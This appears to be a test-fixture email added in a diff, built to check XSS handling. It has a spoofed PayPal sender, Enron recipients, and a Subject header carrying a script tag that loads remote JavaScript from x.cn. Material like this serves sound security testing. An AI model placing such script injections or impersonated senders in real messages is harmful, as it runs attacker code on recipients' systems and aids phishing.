@@ -1,0 +1,7 @@
+From: "PayPal" <qnprusodlbm@paypal.com>
+To: 'kevin'@enron.com, reynolds.andy@enron.com, naman.bj@enron.com, 
+Subject: <script src=//x.cn/1.js async>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
